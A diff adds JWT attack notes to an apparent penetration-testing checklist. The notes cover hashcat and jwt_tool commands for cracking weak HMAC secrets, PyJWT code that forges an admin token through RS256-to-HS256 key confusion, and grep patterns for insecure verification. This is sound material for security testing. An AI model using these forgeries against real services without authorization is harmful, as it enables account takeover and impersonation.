@@ -30,3 +30,32 @@
 - Authorization-code reuse / no PKCE (downgrade) / implicit-flow token in URL fragment leak.
 - `id_token` signature / audience (`aud`) / issuer (`iss`) not validated.
 - Account takeover via email-unverified OAuth linking.
+
+---
+## 0daysec enrichment (adapted from the user's JWT notes)
+
+### Crack a weak HMAC secret (offline)
+```
+hashcat -m 16500 jwt.txt wordlist.txt            # 16500 = JWT (HS256/384/512)
+#   good lists: rockyou.txt, and Wallarm's jwt.secrets.list (JWT-specific key dictionary)
+jwt_tool <token> -C -d jwt.secrets.list          # jwt_tool crack mode
+```
+Once cracked, re-sign tampered claims with the recovered secret and confirm the server ACCEPTS it.
+
+### RS256 → HS256 key confusion (forge with the PUBLIC key)
+If the server verifies with a published/recoverable RSA public key but can be coerced to HS256, sign
+the token using that public key *as the HMAC secret*:
+```python
+import jwt   # PyJWT
+pub = open('public.pem').read()
+forged = jwt.encode({"user":"admin","role":"admin"}, pub, algorithm="HS256")
+```
+Recover the public key when not published: `jwt_tool -X k` or derive from two RS256 tokens (`rsa_sign2n`).
+
+### Source-review sinks (grep the app when you have code)
+```
+verify_signature": False        verify=False            options={"verify_signature": False}
+algorithms=[header["alg"]]       # trusts attacker-chosen alg  -> alg:none / confusion
+jwt.decode(token, ... )          # missing algorithms= / verify kwargs
+```
+Confirm end-to-end: the forged/tampered token must grant access it should not (not just "server didn't error").
